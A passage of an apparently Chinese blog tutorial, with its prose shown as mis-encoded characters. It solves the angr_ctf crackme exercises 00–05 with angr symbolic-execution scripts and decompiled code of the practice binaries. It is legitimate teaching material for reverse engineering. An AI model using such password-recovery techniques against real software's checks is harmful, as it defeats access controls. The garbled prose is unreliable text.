å—</p><p>3.åˆå§‹åŒ–ä»¥åï¼Œæˆ‘ä»¬è¦å¯¹è¿™ä¸ªå—è¿›è¡Œæ¨¡æ‹Ÿ</p><p>sim&#x3D;proj.factory.simgr(state)</p><p>4.æ¨¡æ‹Ÿåï¼Œå¼€å§‹å¯»æ‰¾æ­£ç¡®çš„è·¯å¾„</p><p>ok_address&#x3D;0x8048675<br>sim.explore(find&#x3D;ok_address)  è¿™é‡Œæ˜¯æˆ‘ä»¬è¾“å‡ºæ­£ç¡®çš„è·¯å¾„</p><p>5.æœç´¢åˆ°è·¯å¾„åï¼ŒæŠŠçŠ¶æ€æ”¾åˆ°sim.found[0]é‡Œï¼Œç„¶åä»è¿™ä¸ªçŠ¶æ€é‡Œå–å‡ºæ¥å³å¯</p><pre><code>if sim.found:    solution_state=sim.found[0]    print(solution_state.posix.dumps(sys.stdin.fileno()).decode())</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./00_angr_find&quot;</span></span><br><span class="line">    proj=angr.Project(binary,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    state=proj.factory.entry_state()</span><br><span class="line">    sim=proj.factory.simgr(state)</span><br><span class="line"></span><br><span class="line">    ok_address=<span class="number">0x8048675</span></span><br><span class="line">    sim.explore(find=ok_address)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state=sim.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="äºŒã€01"><a href="#äºŒã€01" class="headerlink" title="äºŒã€01"></a>äºŒã€01</h2><p>è¿™ä¸ªæ¡ˆä¾‹ï¼Œå‰é¢éƒ¨åˆ†è·Ÿ00ä¸€æ ·ï¼Œåœ¨å¯»æ‰¾è·¯å¾„çš„æ—¶å€™ï¼Œexploreçš„æ—¶å€™åŠ ä¸ªavoidå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å°±é¿å¼€é”™è¯¯ä»£ç å—çš„å‚æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./01_angr_avoid&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    state=proj.factory.entry_state()</span><br><span class="line">    sim=proj.factory.simgr(state)</span><br><span class="line"></span><br><span class="line">    ok_address=<span class="number">0x80485E0</span></span><br><span class="line">    bi_kai=<span class="number">0x80485A8</span></span><br><span class="line">    sim.explore(find=ok_address,avoid=bi_kai)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state=sim.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no !!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€02"><a href="#ä¸‰ã€02" class="headerlink" title="ä¸‰ã€02"></a>ä¸‰ã€02</h2><p>è¿™é‡Œåˆšä¸Šé¢ä¸€æ ·ï¼Œå”¯ä¸€çš„åŒºåˆ«å°±æ˜¯ï¼Œè‡ªå·±å†™äº†ä¸€ä¸ªé¿å¼€çš„å‡½æ•°å’Œæ­£ç¡®çš„å‡½æ•°ï¼Œèµ‹ç»™äº†findå’Œavoidï¼Œæ•ˆæœéƒ½æ˜¯ä¸€æ ·çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avoid_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./02_angr_find_condition&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    init_state=proj.factory.entry_state()</span><br><span class="line">    sim=proj.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    ok_address=<span class="number">0x08048715</span></span><br><span class="line">    sim.explore(find=find_path,avoid=avoid_path)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state=sim.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="å››ã€03-regs-å¯„å­˜å™¨"><a href="#å››ã€03-regs-å¯„å­˜å™¨" class="headerlink" title="å››ã€03  regs å¯„å­˜å™¨"></a>å››ã€03  regs å¯„å­˜å™¨</h2><p>è¿™é‡Œå°±æœ‰ç‰¹ç‚¹äº†ï¼Œå¯¹å¯„å­˜å™¨çš„æ“ä½œ</p><p>æˆ‘ä»¬çœ‹é¢˜ç›®ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 user_input; // rax</span><br><span class="line">  <span class="built_in">int</span> v5; // [esp+4h] [ebp-14h]</span><br><span class="line">  <span class="built_in">int</span> v6; // [esp+8h] [ebp-10h]</span><br><span class="line">  <span class="built_in">int</span> v7; // [esp+Ch] [ebp-Ch]</span><br><span class="line">  <span class="built_in">int</span> v8; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  user_input = get_user_input();</span><br><span class="line">  v7 = HIDWORD(user_input);</span><br><span class="line">  v5 = complex_function_1(user_input);</span><br><span class="line">  v6 = complex_function_2();</span><br><span class="line">  v8 = complex_function_3(v7);</span><br><span class="line">  <span class="keyword">if</span> ( v5 || v6 || v8 )</span><br><span class="line">    puts(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    puts(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_user_inputï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> get_user_input()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v1; // [esp+0h] [ebp-18h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v2; // [esp+4h] [ebp-14h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v3[<span class="number">4</span>]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readgsdword(0x14u);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%x %x %x&quot;</span>, &amp;v1, &amp;v2, v3);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šé¢ä¸¤è¡Œä»£ç æˆ‘ä»¬å‘ç°ï¼Œåœ¨getuserinputè¿™ä¸ªå‡½æ•°é‡Œï¼Œå¯¹v1ã€v2ã€v3è¿›è¡Œäº†è¾“å…¥ï¼Œç„¶ååªç”¨äº†v1ï¼Œç„¶åçœ‹æ±‡ç¼–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0804892A 68 93 8A 04 08                push    offset aXXX                     ; &quot;%x %x %x&quot;</span><br><span class="line">.text:0804892F E8 9C FA FF FF                call    ___isoc99_scanf</span><br><span class="line">.text:0804892F</span><br><span class="line">.text:08048934 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:08048937 8B 4D E8                      mov     ecx, [ebp+var_18]</span><br><span class="line">.text:0804893A 89 C8                         mov     eax, ecx</span><br><span class="line">.text:0804893C 8B 4D EC                      mov     ecx, [ebp+var_14]</span><br><span class="line">.text:0804893F 89 CB                         mov     ebx, ecx</span><br><span class="line">.text:08048941 8B 4D F0                      mov     ecx, [ebp+var_10]</span><br><span class="line">.text:08048944 89 CA                         mov     edx, ecx</span><br><span class="line">.text:08048946 90                            nop</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸‰ä¸ªå€¼ä¼ ç»™ äº†eax ebx ecxï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¾“å…¥å‡½æ•°ä¹‹åï¼Œåˆ©ç”¨å‘é‡ç»™ initial_state.regs.eax  ebx edxï¼Œè¿›è¡Œå‘é‡çš„èµ‹å€¼ï¼Œåœ¨åé¢è¿›è¡ŒçŠ¶æ€æŸ¥çœ‹å³å¯ï¼Œåˆ†æå®Œåï¼Œæˆ‘è¿™é‡Œå¯¹å…³é”®çš„exp ä»£ç è¿›è¡Œåˆ†æ</p><p>ï¼ˆ1ï¼‰.start_address&#x3D;0x08048980<br>    initial_state&#x3D;proj.factory.blank_state(addr&#x3D;start_address) è¿™é‡Œåœ¨è¾“å…¥å‡½æ•°ä¹‹åå¼€å§‹ç©ºç™½å—ï¼Œæˆ‘è¿™é‡Œç†è§£çš„ç©ºç™½å—æ˜¯ä»è¿™é‡Œå¼€å§‹è¿›è¡Œå‘ä¸‹æ‰§è¡Œï¼Œå¹¶ä¸”ç»•è¿‡ç¨‹åºè‡ªå·±çš„è¾“å…¥å‡½æ•°ï¼Œæˆ‘ä»¬è‡ªå·±è¿›è¡Œå¯¹regæ¥æ“ä½œèµ‹å€¼</p><p>ï¼ˆ2ï¼‰.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">passwd_0=claripy.BVS(<span class="string">&#x27;passwd_0&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_1=claripy.BVS(<span class="string">&#x27;passwd_1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_2=claripy.BVS(<span class="string">&#x27;passwd_2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    initial_state.regs.eax=passwd_0</span><br><span class="line">    initial_state.regs.ebx=passwd_1</span><br><span class="line">    initial_state.regs.edx=passwd_2</span><br></pre></td></tr></table></figure><p>ç”¨claripyè¿›è¡Œå‘é‡çš„åˆ›å»ºï¼Œåˆ›å»º3ä¸ªå‘é‡ï¼Œå› ä¸ºæ˜¯int32ä½ï¼Œæ‰€ä»¥è¿™é‡Œåé¢å†™æˆäº†32ï¼Œç„¶åå†æŠŠä¸‰ä¸ªå‘é‡å¯¼å…¥åˆ°eax ebx edx</p><p>ï¼ˆ3ï¼‰.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">simgr=proj.factory.simgr(initial_state)</span><br><span class="line">simgr.explore(find=find_path,avoid=avoid_path)</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œå¹¶ä¸”æŸ¥è¯¢</p><p>ï¼ˆ4) .</p><p>ç„¶åé€šè¿‡simgr.foundè·å–è§£å†³åçš„stateï¼ˆçŠ¶æ€ï¼‰ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">solution0=solution_state.solver.eval(passwd_0)</span><br><span class="line">        solution1=solution_state.solver.eval(passwd_1)</span><br><span class="line">        solution2=solution_state.solver.eval(passwd_2)</span><br></pre></td></tr></table></figure><p>ç„¶åå†ç”¨solution_state.solver.evalè·å–çŠ¶æ€å€¼ï¼Œè·å–åˆ°çŠ¶æ€å€¼æ‰“å°å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avoid_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./03_angr_symbolic_registers&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    start_address=<span class="number">0x08048980</span></span><br><span class="line">    initial_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    passwd_0=claripy.BVS(<span class="string">&#x27;passwd_0&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_1=claripy.BVS(<span class="string">&#x27;passwd_1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_2=claripy.BVS(<span class="string">&#x27;passwd_2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    initial_state.regs.eax=passwd_0</span><br><span class="line">    initial_state.regs.ebx=passwd_1</span><br><span class="line">    initial_state.regs.edx=passwd_2</span><br><span class="line"></span><br><span class="line">    simgr=proj.factory.simgr(initial_state)</span><br><span class="line">    simgr.explore(find=find_path,avoid=avoid_path)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        solution0=solution_state.solver.<span class="built_in">eval</span>(passwd_0)</span><br><span class="line">        solution1=solution_state.solver.<span class="built_in">eval</span>(passwd_1)</span><br><span class="line">        solution2=solution_state.solver.<span class="built_in">eval</span>(passwd_2)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;passwd0:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution0)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;passwd1:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution1)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;passwd2:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution2)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Could not find the solution!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="äº”ã€04-stack"><a href="#äº”ã€04-stack" class="headerlink" title="äº”ã€04 stack"></a>äº”ã€04 stack</h2><p>è¿™é‡Œæ˜¯å¯¹stackçš„ä¸€ä¸ªç¬¦å·åŒ–ï¼Œå¯¹æ ˆçš„åŒ–ï¼Œå°±å¾—æ³¨æ„æ ˆçš„åˆ†å¸ƒäº†ï¼Œespå’Œebpå¯„å­˜å™¨è¿™äº›</p><p>æˆ‘ä»¬è¿˜æ˜¯é€‰å…³é”®ä»£ç è¿›è¡Œåˆ†æ</p><p>ï¼ˆ1ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passwd0=claripy.BVS(<span class="string">&quot;passwd0&quot;</span>,<span class="number">32</span>)  <span class="comment">#è¿™é‡Œåˆ›å»ºäº†å‘é‡</span></span><br><span class="line">passwd1=claripy.BVS(<span class="string">&quot;passwd1&quot;</span>,<span class="number">32</span>)   <span class="comment">#</span></span><br><span class="line">initial_state.regs.ebp=initial_state.regs.esp  </span><br><span class="line">initial_state.regs.esp-=<span class="number">0x8</span> <span class="comment">#scanf</span></span><br><span class="line">initial_state.stack_push(passwd0)</span><br><span class="line">initial_state.stack_push(passwd1)</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ­¥å…ˆæŠŠå¯„å­˜å™¨espç»™äº†ebpï¼Œç„¶åè®©esp-0x8ï¼Œè¿™é‡Œå‡0x8çš„åŸå› ï¼Œæˆ‘æ¨æµ‹æœ‰ä¸¤ä¸ªåŸå› ï¼Œä¸€æ˜¯è”ç³»ä¸Šä¸‹æ–‡ã€äºŒæ˜¯å¼€è¾Ÿæ ˆç©ºé—´</p><p>ç„¶åæŠŠæˆ‘ä»¬åˆ›å»ºçš„å‘é‡æ”¾åˆ°stackä¸Šå³å¯ï¼Œä¸‹é¢ä»£ç è¿˜æ˜¯è€ä¸€å¥—ï¼Œsolver.eval(å‘é‡çŠ¶æ€)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./04_angr_symbolic_stack&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line"></span><br><span class="line">    start_address=<span class="number">0x8048697</span></span><br><span class="line">    initial_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    passwd0=claripy.BVS(<span class="string">&quot;passwd0&quot;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd1=claripy.BVS(<span class="string">&quot;passwd1&quot;</span>,<span class="number">32</span>)</span><br><span class="line">    initial_state.regs.ebp=initial_state.regs.esp</span><br><span class="line">    initial_state.regs.esp-=<span class="number">0x8</span> <span class="comment">#scanf</span></span><br><span class="line">    initial_state.stack_push(passwd0)</span><br><span class="line">    initial_state.stack_push(passwd1)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#initial_state.regs.esp-=12  #.text:08048682 8D 45 F0                      lea     eax, [ebp+var_10]the relative position of esp when return from scanf()</span></span><br><span class="line">    simgr=proj.factory.simgr(initial_state)</span><br><span class="line">    simgr.explore(find=<span class="number">0x80486E1</span>,avoid=<span class="number">0x80486CF</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        solution0=solution_state.solver.<span class="built_in">eval</span>(passwd0)</span><br><span class="line">        solution1=solution_state.solver.<span class="built_in">eval</span>(passwd1)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd0:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution0)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution1)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Colindd not !!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><p>å…­ã€05 meâ€™mory</p><p>è¿™é“é¢˜æ˜¯å¯¹memoryå†…å­˜è¿›è¡Œç¬¦å·åŒ–</p><p>æˆ‘ä»¬çœ‹ä¸‹æºä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(user_input, <span class="number">0</span>, <span class="number">0x21</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s %8s %8s %8s&quot;</span>, user_input, &amp;unk_A1BA1C8, &amp;unk_A1BA1D0, &amp;unk_A1BA1D8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0xA1BA1C0</span>) = complex_function(*(<span class="type">char</span> *)(i + <span class="number">0xA1BA1C0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(user_input, <span class="string">&quot;NJPURZPCDYEAXCSJZJMPSOMBFDDLHBVN&quot;</span>, <span class="number">0x20</span>u) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä»¥ä¸Šä»£ç ï¼Œæˆ‘ä»¬å‘ç°æ˜¯å¾€å†…å­˜bssæ®µé‡Œè¯»å…¥4ä¸ª8bytesï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨ä¸€ä¸ªä¸ºå†…å­˜èµ‹å€¼çš„è¯­å¥</p><p>init_state.memory.store(address,passwd0)   è¿™ä¸ªæ˜¯æŠŠpasswd0èµ‹å€¼ç»™addressè¿™ä¸ªåœ°å€çš„é‡Œ</p><p>ç„¶åæˆ‘ä»¬åˆ›å»º4ä¸ªå˜é‡å¹¶ä¸”æŠŠè¿™ä¸ªå››ä¸ªå˜é‡æ”¾åˆ°è¯»å…¥çš„å†…å­˜é‡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">address=<span class="number">0xA1BA1C0</span></span><br><span class="line">init_state.memory.store(address,passwd0)  <span class="comment">#æ”¾åˆ°</span></span><br><span class="line">init_state.memory.store(address+<span class="number">0x8</span>,passwd1)</span><br><span class="line">init_state.memory.store(address+<span class="number">0x10</span>,passwd2)</span><br><span class="line">init_state.memory.store(address+<span class="number">0x18</span>,passwd3)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„å­—èŠ‚çš„å¢é•¿</p><p>ç„¶åä¸‹é¢å°±æ˜¯æŒ‰ç…§ä¹‹å‰çš„æ–¹æ³•è·å–ç›¸åº”çš„çŠ¶æ€å€¼å³å¯</p><figure class="highlight 